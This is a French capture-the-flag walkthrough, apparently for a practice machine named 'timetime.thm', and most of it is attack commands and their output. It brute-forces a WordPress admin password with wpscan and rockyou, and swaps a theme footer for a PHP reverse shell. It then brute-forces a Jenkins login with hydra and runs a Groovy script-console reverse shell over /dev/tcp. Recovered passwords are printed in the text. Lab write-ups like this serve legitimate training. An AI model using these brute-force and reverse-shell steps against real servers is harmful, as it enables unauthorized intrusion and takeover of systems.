@@ -1,0 +1,171 @@
+
+Regarder les ports ouvertes
+```bash
+nmap <ip>
+```
+=>
+22/tcp open  ssh
+80/tcp open  http
+
+Vérifier le site web sur le port 80
+```bash
+gobuster dir -u http://10.10.42.171 -w Desktop/wordlists/dirb/common.txt
+```
+=>
+/.hta                 (Status: 403) [Size: 277]
+/.htpasswd            (Status: 403) [Size: 277]
+/blog                 (Status: 301) [Size: 311] [--> http://10.10.42.171/blog/]
+/.htaccess            (Status: 403) [Size: 277]
+/index.html           (Status: 200) [Size: 10918]
+/javascript           (Status: 301) [Size: 317] [--> http://10.10.42.171/javascript/]
+/phpmyadmin           (Status: 301) [Size: 317] [--> http://10.10.42.171/phpmyadmin/]
+/server-status        (Status: 403) [Size: 277]
+/wordpress            (Status: 301) [Size: 316] [--> http://10.10.42.171/wordpress/]
+
+NOus pouvons aller voir sur
+http://10.10.42.171/blog/
+
+on est rediriger sur http://timetime.thm/blog/ qui est illisible
+
+Nous pouvons remarquer que les fichiers de styles sont inclus depuis le domaine timetime.thm
+
+Nous allons donc ajouter l’adresse IP de la machine cible suivi du nom de domaine dans le fichier host:
+
+```bash
+echo "10.10.42.171 timetime.thm" >> /etc/hosts
+```
+
+mainetant http://10.10.42.171/blog/ est lisible
+
+en bas de la page on vois "Proudly powered by WordPress"
+qui nous dit que le site à été fais avec WordPress
+
+wpscan permet de scan le site WordPress et voir les faille
+on va utilisé les flag suivant:
+-e pour signifier énumération
+u pour designer utilisateur
+vp pour signifier les plugins vulnérables
+vt pour signifier les thèmes vulnérables
+dbe pour signifier l’export de la base de données
+
+```bash
+wpscan -e u vp vt dbe --url http://timetime.thm/blog/
+```
+=>
+[+] admin
+ | Found By: Author Posts - Author Pattern (Passive Detection)
+ | Confirmed By:
+ |  Rss Generator (Passive Detection)
+ |  Wp Json Api (Aggressive Detection)
+ |   - http://timetime.thm/blog/index.php/wp-json/wp/v2/users/?per_page=100&page=1
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+Nous pouvons bruteforce le mots de passe de admin avec wpscan
+```bash
+wpscan -U admin -P Desktop/wordlists/rockyou.txt --url http://timetime.thm/blog/
+```
+=>
+[!] Valid Combinations Found:
+ | Username: admin, Password: romania
+
+Nous pouvons maintenant nous login dans word presse en tant que admin sur
+http://timetime.thm/blog/wp-admin/
+
+on peut aller dans appareance puis theme
+
+on voit que "Twenty Seventeen" est actif
+
+on peut aller dans le theme editor pour creer un reverse shell
+
+le footer entant tous le temps executer, on peut remplacer le fichier footer.php par un reverse shelle en php avec ce site:
+
+https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+
+nous avons juste a adapter l'ip et le port
+
+apres nous allons receptioner le reverse shell sur notre machine avec cette commande
+```bash
+nc -lvnp 1234
+```
+
+en retournant sur
+http://10.10.42.171/blog/
+cela actualise la page et active notre reverse shell
+
+en fouillant dans les fichier, dans
+/opt
+on trouve le fichier
+wp-save.txt
+
+```bash
+$ cat /opt/wp-save.txt
+```
+=>
+Myd,
+
+Squeezie avea nevoie de aceste acreditări pentru ceva mai târziu. Spune-i că le ai și unde sunt.
+
+time_time_best_single
+
+en français ça veut dire:
+Squeezie avait besoin de ces informations d'identification pour quelque chose plus tard. Dites-lui que vous les avez et où ils se trouvent.
+
+avec ce username et ce mdp
+on peut se login en ssh
+
+```bash
+ssh squeezie@10.10.160.99
+```
+
+et récupéré le user
+```bash
+cat user.txt
+```
+
+en fouillant on trouve le fichier jenkins
+qui nous indique que jenkins tourne sur une autre ip
+on devrais donc pouvoir la joindre avec cette commande
+```bash
+ssh -L 2345:<jenkins ip>:<jenkins port> squeezie@<ip>
+```
+
+Nous pouvons mainenant nous login en allans sur
+http://127.0.0.1:2345
+
+nous arrivons sur la page de login de jenkins
+
+nous devons bruforce le login et le password de jenkins avec hydra
+
+```bash
+hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost -s 2345 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
+```
+=>
+nous obtenons un login et un password et nous pouvons nous connnecter à jenkins
+
+Une vulnérabilité connue de Jenkins est l’exécution de commande à distance.
+Pour le faire, nous allons dans le menu Manage jenkins puis sur Script console
+
+et nous mettons ceci:
+```bash
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<notre ip>/3456;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+```
+
+dans notre terminal nous pouvons faire cette commande pour acceuillir le reverse shell:
+```bash
+nc -lnvp 3456
+```
+
+en nous baladas dans le shell nous pouvons trouvé dans /opt une note.txt qui nous donne le login et le password root
+
+```bash
+ssh <user root>@<ip>
+```
+
+et nous pouvons avoir le flag root
+
+```bash
+cat root.txt
+```
